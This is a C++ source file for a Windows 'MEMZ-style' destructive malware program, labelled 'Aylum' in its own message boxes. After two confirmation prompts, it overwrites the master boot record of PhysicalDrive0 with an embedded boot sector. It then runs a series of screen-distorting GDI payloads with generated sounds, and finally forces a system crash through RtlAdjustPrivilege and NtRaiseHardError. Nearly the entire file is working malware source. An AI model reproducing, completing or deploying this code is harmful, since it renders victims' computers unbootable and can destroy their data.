#define _USE_MATH_DEFINES 1
#include <Windows.h>
#include <cmath>
#include <time.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);
const unsigned char MasterBootRecord[] = {
	0x31, 0xDB, 0x8E, 0xDB, 0xBC, 0x00, 0x7C, 0xDB, 0xE3, 0xB8, 0x13, 0x00,
	0xCD, 0x10, 0x31, 0xDB, 0x31, 0xC0, 0x8E, 0xC3, 0xBF, 0x00, 0x7E, 0xB9,
	0x00, 0x02, 0xF3, 0xAA, 0xFF, 0x06, 0x20, 0x7E, 0xD9, 0x06, 0x00, 0x7E,
	0xD8, 0x06, 0xD9, 0x7D, 0xD9, 0x16, 0x00, 0x7E, 0xD9, 0xFB, 0xD9, 0x1E,
	0x08, 0x7E, 0xD9, 0x1E, 0x04, 0x7E, 0xD9, 0x06, 0xD5, 0x7D, 0xD8, 0x06,
	0xD9, 0x7D, 0xD9, 0x16, 0xD5, 0x7D, 0xD9, 0xFB, 0xD9, 0x1E, 0x10, 0x7E,
	0xD9, 0x1E, 0x0C, 0x7E, 0xBB, 0x00, 0x30, 0xB0, 0x7F, 0x8E, 0xC3, 0x31,
	0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xAA, 0x30, 0xC0, 0xBB, 0x00, 0x20, 0x8E,
	0xC3, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xAA, 0xBB, 0xCF, 0xFF, 0xD9,
	0x06, 0x00, 0x7E, 0xD9, 0xFE, 0xD8, 0x0E, 0xDD, 0x7D, 0xDF, 0x1E, 0x22,
	0x7E, 0x8B, 0x0E, 0x22, 0x7E, 0x83, 0xC1, 0x32, 0xBD, 0x63, 0x00, 0xB8,
	0xCF, 0xFF, 0xBA, 0x63, 0x00, 0xBE, 0x04, 0x00, 0xE8, 0x3D, 0x00, 0x87,
	0xD9, 0xF7, 0xDB, 0x4E, 0x75, 0xF6, 0xBE, 0x05, 0x00, 0x91, 0xF7, 0xD9,
	0xE8, 0x2D, 0x00, 0xBE, 0x06, 0x00, 0xF7, 0xD8, 0xF7, 0xD9, 0xE8, 0x23,
	0x00, 0x91, 0xF7, 0xD9, 0x40, 0x4A, 0x75, 0xD9, 0x43, 0x4D, 0x75, 0xCF,
	0x1E, 0xB8, 0x00, 0x20, 0x8E, 0xD8, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31,
	0xF6, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xA4, 0x1F, 0xE9, 0x50, 0xFF,
	0x66, 0x60, 0xA3, 0x14, 0x7E, 0x89, 0x1E, 0x18, 0x7E, 0x89, 0x0E, 0x1C,
	0x7E, 0xDF, 0x06, 0x14, 0x7E, 0xD9, 0x1E, 0x14, 0x7E, 0xDF, 0x06, 0x18,
	0x7E, 0xD9, 0x1E, 0x18, 0x7E, 0xDF, 0x06, 0x1C, 0x7E, 0xD9, 0x1E, 0x1C,
	0x7E, 0xD9, 0x06, 0x04, 0x7E, 0xD9, 0x06, 0x08, 0x7E, 0xD9, 0x06, 0x18,
	0x7E, 0xD8, 0xC9, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE, 0xE9, 0xD9,
	0x06, 0x18, 0x7E, 0xD8, 0xCB, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE,
	0xC1, 0xD9, 0x1E, 0x1C, 0x7E, 0xD9, 0x1E, 0x18, 0x7E, 0xDD, 0xD8, 0xDD,
	0xD8, 0xD9, 0x06, 0x0C, 0x7E, 0xD9, 0x06, 0x10, 0x7E, 0xD9, 0x06, 0x14,
	0x7E, 0xD8, 0xC9, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE, 0xC1, 0xD9,
	0x06, 0x14, 0x7E, 0xD8, 0xCB, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE,
	0xE9, 0xD9, 0xC0, 0xD8, 0x0E, 0xCD, 0x7D, 0xDF, 0x1E, 0x1C, 0x7E, 0xD8,
	0x06, 0xC9, 0x7D, 0xD9, 0x06, 0x18, 0x7E, 0xD8, 0xF1, 0xD8, 0x0E, 0xD1,
	0x7D, 0xDF, 0x1E, 0x18, 0x7E, 0xDE, 0xF9, 0xD8, 0x0E, 0xD1, 0x7D, 0xDF,
	0x1E, 0x14, 0x7E, 0xDD, 0xD8, 0xDD, 0xD8, 0x8B, 0x3E, 0x20, 0x7E, 0xC1,
	0xEF, 0x04, 0x01, 0xFE, 0x83, 0xE6, 0x0F, 0x8A, 0x9C, 0xE1, 0x7D, 0x8B,
	0x36, 0x14, 0x7E, 0x8B, 0x3E, 0x18, 0x7E, 0x81, 0xC6, 0xA0, 0x00, 0x83,
	0xC7, 0x64, 0x81, 0xFE, 0x40, 0x01, 0x7D, 0x2C, 0x85, 0xF6, 0x78, 0x28,
	0x81, 0xFF, 0xC8, 0x00, 0x7D, 0x22, 0x85, 0xFF, 0x78, 0x1E, 0x69, 0xFF,
	0x40, 0x01, 0x01, 0xF7, 0xB9, 0x00, 0x30, 0xBE, 0x00, 0x20, 0xA0, 0x1C,
	0x7E, 0x8E, 0xC1, 0x26, 0x3A, 0x05, 0x7D, 0x08, 0x26, 0x88, 0x05, 0x8E,
	0xC6, 0x26, 0x88, 0x1D, 0x8E, 0xC6, 0x66, 0x61, 0xC3, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x96, 0x43, 0x9A, 0x99, 0x99, 0x3F, 0x00, 0x00, 0x20,
	0x43, 0x00, 0x00, 0x00, 0x40, 0x0A, 0xD7, 0xA3, 0x3B, 0x00, 0x00, 0x70,
	0x41, 0x20, 0x22, 0x23, 0x25, 0x26, 0x27, 0x28, 0x2A, 0x2C, 0x2D, 0x2F,
	0x30, 0x32, 0x34, 0x36, 0x37, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

void mbr()
{
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);
    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}

DWORD WINAPI payload1(LPVOID lpParam) {
	int a, b;
	while (0 == 0) {
		a = GetSystemMetrics(SM_CXSCREEN);
		b = GetSystemMetrics(SM_CYSCREEN);
		StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY);
	}
}
DWORD WINAPI payload2(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		SetStretchBltMode(hdc, HALFTONE);
		StretchBlt(hdc, -20, 0, sw, sh + 20, hdc, 0, 0, sw, sh, SRCPAINT);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI payload2dot1(LPVOID lpParam) {
	while(1){
		HDC hdc = GetDC(HWND_DESKTOP);
		int icon_x = GetSystemMetrics(SM_CXICON);
		int icon_y = GetSystemMetrics(SM_CYICON) ;
		POINT cursor;
        GetCursorPos(&cursor);
        DrawIcon(hdc, cursor.x - icon_x, cursor.y - icon_y, LoadIcon(NULL, IDI_WARNING));
        ReleaseDC(0, hdc);
	}
}
DWORD WINAPI payload3(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN),
			h = GetSystemMetrics(SM_CYSCREEN);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 128, rand() % 128, rand() % 128));
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI payload4(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
	while(1){
		HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
		int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y; 
    	HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    	SelectObject(hdc, brush);
		Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
        if (y >= GetSystemMetrics(SM_CYSCREEN))
        {
                signY = -10;
        }
        if (x >= GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -5;
        }
        if (y == 0)
        {
            signY = 10;
        }
        if (x == 0)
        {
            signX = 5;
        }
        Sleep(10);
    	DeleteObject(brush);
        ReleaseDC(0, hdc);
	}
}
DWORD WINAPI payload5(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand()%0xff;
        for (int i = 0; w * h > i; i++) {
            if (i % h == 0 && rand() % 100 == 0)
                v = rand() % 24;
                    *((BYTE*)data + 4 * i + v) += *((BYTE*)(data + i + v));
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
} 
DWORD WINAPI payload6(LPVOID lpParam) {
	int ticks = GetTickCount(), w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {

		HDC hdc = GetDC(0), hdcMem = CreateCompatibleDC(hdc);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;BYTE bt = 0;
		if ((GetTickCount() - ticks) > 60000) bt = rand() & 0xffffff;
		for (int i = 0; w * h > i; i++) {
			if (!(i % h == 0) && !((rand() % 100))) v = rand() % 2;
			*((BYTE*)data + 4 * i + v) += *((BYTE*)data + v);
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
	}
}
DWORD WINAPI payload7(LPVOID lpParam) {
	while(1){
    	HDC hdc = GetDC(NULL);
    	int w = GetSystemMetrics(SM_CXSCREEN),
        h = GetSystemMetrics(SM_CYSCREEN),
        rx = rand() % w;
   		BitBlt(hdc, rx, 10, 100, h, hdc, rx, 0, SRCCOPY);
    	ReleaseDC(NULL, hdc);
	}
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(t/401^t/400));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t+t^(t>>6)*t&t>>8|t>>3);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*((t&4096?t%65556<53333?7:t&7:8)+(1&t>>14))>>(4&t>>(t&512?2:2))|t>>(t&16384?t&4096?10:3:2));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t+t>>t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t>>7|t|t>>6)*150+8*(t&t>>13|t>>9);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t/800|10)*t&85)-t&t/4);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*t&t*t>>t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
    if (MessageBoxW(NULL, L"Run Malware?", L"Aylum by Minhgotuknight10", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"Are You Sure?", L"G3T R3KT L0L", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            mbr();
            HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
            HANDLE thread2dot1 = CreateThread(0, 0, payload2dot1, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            TerminateThread(thread2dot1, 0);
            CloseHandle(thread2);
            CloseHandle(thread2dot1);
            InvalidateRect(0, 0, 0);
            HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            InvalidateRect(0, 0, 0);
            HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            InvalidateRect(0, 0, 0);
            HANDLE thread7 = CreateThread(0, 0, payload7, 0, 0, 0);
            sound7();
            Sleep(30000);
            BOOLEAN b;
				     unsigned long response;
				     RtlAdjustPrivilege(19, true, false, &b);
				     NtRaiseHardError(0xC000022C, 0, 0, 0, 6, &response);
            Sleep(-1);
        }
    }
}
